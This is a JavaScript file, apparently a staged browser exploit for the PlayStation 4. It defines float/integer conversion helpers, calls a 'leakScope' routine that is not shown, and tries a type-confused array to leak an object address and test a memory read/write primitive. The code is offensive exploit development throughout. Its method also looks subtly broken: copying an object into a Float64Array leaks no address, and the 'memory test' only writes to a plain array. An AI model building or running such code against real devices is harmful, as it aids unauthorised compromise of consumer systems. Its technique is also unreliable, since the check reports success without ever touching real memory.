// pirim.js - PS4-safe implementation with DEBUG INSTRUMENTATION
const memBuffers = {
    float64: new Float64Array(1),
    u32: null
};
memBuffers.u32 = new Uint32Array(memBuffers.float64.buffer);

var leak = null;

function ftoi(val) {
    try {
        memBuffers.float64[0] = val;
        const result = memBuffers.u32[0] + memBuffers.u32[1] * 0x100000000;
        log(`ftoi: 0x${result.toString(16)}`, 'debug');
        return result;
    } catch (e) {
        log(`Conversion failed: ${e}`, 'error');
        return 0;
    }
}

function itof(val) {
    try {
        memBuffers.u32[0] = val % 0x100000000;
        memBuffers.u32[1] = Math.floor(val / 0x100000000);
        return memBuffers.float64[0];
    } catch (e) {
        log(`Conversion failed: ${e}`, 'error');
        return 0;
    }
}

function pirim_stage1() {
    log("===== STAGE 1 START =====", 'info');
    leak = leakScope();
    
    if (leak === null) {
        log("Stage 1 failed", 'error');
    } else {
        log("Stage 1 success", 'success');
        debugMemory.inspectObject(leak);
    }
    log("===== STAGE 1 END =====", 'info');
}

function pirim_stage2() {
    log("===== STAGE 2 START =====", 'info');
    
    try {
        // 1. Create type-confused array
        const confusedArray = [1.1, 2.2, 3.3];
        confusedArray[0] = leak;  // Replace first element with our leaked object
        
        // 2. Create float view of the array
        const floatView = new Float64Array(confusedArray.length);
        for (let i = 0; i < confusedArray.length; i++) {
            floatView[i] = confusedArray[i];
        }
        
        // 3. Extract address from first element
        const leakedAddr = floatView[0];
        const addrValue = ftoi(leakedAddr);
        const addrHex = addrValue.toString(16);
        
        log(`Leaked address: 0x${addrHex}`, 'info');
        
        // 4. Verify if it's a valid pointer
        if (addrValue > 0x100000) {
            log(`Attempting memory test at 0x${addrHex}`, 'debug');
            
            // Create memory access primitive
            const memoryAccess = [itof(addrValue), {}];
            const testValue = 0x11223344;
            
            // Save original value
            const original = ftoi(memoryAccess[0]);
            log(`Original value: 0x${original.toString(16)}`, 'debug');
            
            // Write test value
            memoryAccess[0] = itof(testValue);
            
            // Read back
            const readBack = ftoi(memoryAccess[0]);
            log(`Read back: 0x${readBack.toString(16)} vs Expected: 0x${testValue.toString(16)}`, 'debug');
            
            // Restore original value
            memoryAccess[0] = itof(original);
            
            if (readBack === testValue) {
                log("Memory control verified!", 'success');
            } else {
                log(`Test failed (got 0x${readBack.toString(16)})`, 'warn');
            }
        } else {
            log(`Address 0x${addrHex} too low, skipping test`, 'warn');
            
            // Debug: Inspect the float values
            log("Float view values:", 'debug');
            for (let i = 0; i < floatView.length; i++) {
                const val = floatView[i];
                const hexVal = ftoi(val).toString(16);
                log(`  [${i}]: ${val} (0x${hexVal})`, 'debug');
            }
        }
    } catch (e) {
        log(`Stage 2 error: ${e.message}`, 'error');
    }
    
    log("===== STAGE 2 END =====", 'info');
}